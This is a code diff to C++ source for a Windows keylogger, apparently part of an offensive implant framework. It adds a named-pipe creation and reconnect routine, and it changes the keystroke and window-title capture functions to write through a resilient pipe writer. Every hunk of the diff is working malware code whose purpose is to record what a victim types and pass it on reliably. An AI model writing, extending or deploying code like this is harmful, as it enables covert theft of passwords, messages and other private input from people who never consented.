@@ -89,6 +89,79 @@ auto DECLFN KeyloggerInstall(
     return KeyloggerCleanup();
 }
 
+auto DECLFN CreateAndWaitPipe() -> BOOL {
+    G_INSTANCE
+
+        SECURITY_ATTRIBUTES SecAttr = {
+            .nLength = sizeof(SECURITY_ATTRIBUTES),
+            .lpSecurityDescriptor = nullptr,
+            .bInheritHandle = TRUE
+    };
+
+    // close old handle if present
+    if (Instance->Pipe.Write && Instance->Pipe.Write != INVALID_HANDLE_VALUE) {
+        // disconnect then close
+        Instance->Win32.DisconnectNamedPipe(Instance->Pipe.Write);
+        Instance->Win32.NtClose((HANDLE)Instance->Pipe.Write);
+        Instance->Pipe.Write = INVALID_HANDLE_VALUE;
+    }
+
+    Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
+        Instance->Pipe.Name,
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+        1,
+        PIPE_BUFFER_LENGTH,
+        PIPE_BUFFER_LENGTH,
+        0,
+        &SecAttr
+    );
+
+    if (Instance->Pipe.Write == INVALID_HANDLE_VALUE) {
+        DWORD err = NtCurrentTeb()->LastErrorValue;
+        return FALSE;
+    }
+
+    // Wait for a client to connect.
+    if (!Instance->Win32.ConnectNamedPipe(Instance->Pipe.Write, nullptr) &&
+        NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
+        DWORD err = NtCurrentTeb()->LastErrorValue;
+        Instance->Win32.NtClose((HANDLE)Instance->Pipe.Write);
+        Instance->Pipe.Write = INVALID_HANDLE_VALUE;
+        return FALSE;
+    }
+
+    Instance->Win32.SetStdHandle(STD_OUTPUT_HANDLE, Instance->Pipe.Write);
+    return TRUE;
+}
+
+auto DECLFN SafePipeWrite(
+    _In_ CONST VOID* Buffer,
+    _In_ DWORD      BytesToWrite
+) -> BOOL {
+    G_INSTANCE
+
+        if (!Instance->Pipe.Write || Instance->Pipe.Write == INVALID_HANDLE_VALUE) {
+            if (!CreateAndWaitPipe()) return FALSE;
+        }
+
+    DWORD BytesWritten = 0;
+    BOOL  ok = Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, BytesToWrite, &BytesWritten, NULL);
+    if (ok) return TRUE;
+
+    DWORD err = NtCurrentTeb()->LastErrorValue;
+
+    if (err == ERROR_NO_DATA || err == ERROR_BROKEN_PIPE || err == ERROR_PIPE_NOT_CONNECTED) {
+        // try to recreate and retry once
+        CreateAndWaitPipe();
+        BytesWritten = 0;
+        ok = Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, BytesToWrite, &BytesWritten, NULL);
+        return ok ? TRUE : FALSE;
+    }
+
+    return FALSE;
+}
+
 auto DECLFN CALLBACK WndCallback(
     _In_ HWND   Window,
     _In_ UINT   Message,
@@ -170,10 +243,7 @@ VOID ProcessWindowTitle()
 
             Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, Instance->g_TitleBuffer);
 
-            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, Instance->Win32.wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
-            {
-                return;
-            }
+            SafePipeWrite(Title, (DWORD)(Instance->Win32.wcslen(Title) * sizeof(wchar_t)));
         }
     }
 }
@@ -230,10 +300,7 @@ VOID ProcessKey(UINT Key)
             }
     }
 
-    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, Instance->Win32.wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL))
-    {
-        return;
-    }
+    SafePipeWrite(Buffer, (DWORD)(Instance->Win32.wcslen(Buffer) * sizeof(WCHAR)));
 }
 
 auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
